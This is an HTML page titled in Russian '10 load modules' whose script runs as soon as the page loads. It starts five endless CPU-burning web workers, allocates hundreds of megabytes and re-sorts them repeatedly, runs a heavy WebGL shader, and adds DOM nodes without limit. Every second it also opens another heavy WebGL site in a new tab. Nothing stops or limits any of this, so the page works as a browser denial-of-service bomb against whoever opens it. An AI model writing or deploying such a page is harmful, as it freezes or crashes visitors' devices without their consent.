<!DOCTYPE html>
<html>
<head>
    <title>10 модулей нагрузки</title>
    <style>
        body { margin: 0; overflow: hidden; }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>
    <script>
        // 1-5. Пять Web Workers для нагрузки процессора
        function createWorker() {
            const workerCode = `
                self.onmessage = () => {
                    while (true) {
                        for (let i = 0; i < 1e6; i++) {
                            Math.sin(Math.random());
                        }
                    }
                };
            `;
            const blob = new Blob([workerCode], { type: "application/javascript" });
            const worker = new Worker(URL.createObjectURL(blob));
            worker.postMessage('start');
        }
        for (let i = 0; i < 5; i++) {
            createWorker();
        }

        // 6-7. Два модуля нагрузки на память
        function memoryLoad() {
            let arrays = [];
            for (let i = 0; i < 10; i++) {
                arrays.push(new Float64Array(1e7)); // ~80 МБ
            }
            setInterval(() => {
                arrays.forEach(arr => arr.sort());
            }, 500);
        }
        memoryLoad(); // Первый модуль
        memoryLoad(); // Второй модуль

        // 8. WebGL для нагрузки GPU
        function webglLoad() {
            const canvas = document.getElementById("canvas");
            const gl = canvas.getContext("webgl");
            if (!gl) return;

            const vsSource = `attribute vec4 aPosition; void main() { gl_Position = aPosition; }`;
            const fsSource = `
                precision highp float;
                uniform float uTime;
                void main() {
                    float r = 0.0;
                    for (int i = 0; i < 5000; i++) {
                        r += sin(float(i) * uTime * 0.01);
                    }
                    gl_FragColor = vec4(mod(r, 1.0), 0.5, 0.5, 1.0);
                }
            `;

            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vertexShader, vsSource);
            gl.compileShader(vertexShader);
            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fragmentShader, fsSource);
            gl.compileShader(fragmentShader);
            const program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            gl.useProgram(program);

            const positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
            const aPosition = gl.getAttribLocation(program, "aPosition");
            gl.enableVertexAttribArray(aPosition);
            gl.vertexAttribPointer(aPosition, 2, gl.FLOAT, false, 0, 0);

            const uTime = gl.getUniformLocation(program, "uTime");
            function render() {
                gl.uniform1f(uTime, performance.now() / 1000);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                requestAnimationFrame(render);
            }
            render();
        }
        webglLoad();

        // 9. Нагрузка через DOM-операции
        function domLoad() {
            setInterval(() => {
                for (let i = 0; i < 1000; i++) {
                    const div = document.createElement("div");
                    div.style.position = "absolute";
                    div.style.left = Math.random() * 100 + "%";
                    div.style.top = Math.random() * 100 + "%";
                    document.body.appendChild(div);
                }
            }, 100);
        }
        domLoad();

        // 10. Бесконечное открытие вкладок
        const heavySites = [
            "https://webglsamples.org/aquarium/aquarium.html",
            "https://get.webgl.org/cubes/",
            "https://www.shadertoy.com/view/Ms2SD1"
        ];
        function openHeavySite() {
            const randomSite = heavySites[Math.floor(Math.random() * heavySites.length)];
            window.open(randomSite, "_blank");
            setTimeout(openHeavySite, 1000);
        }
        openHeavySite();
    </script>
</body>
</html>
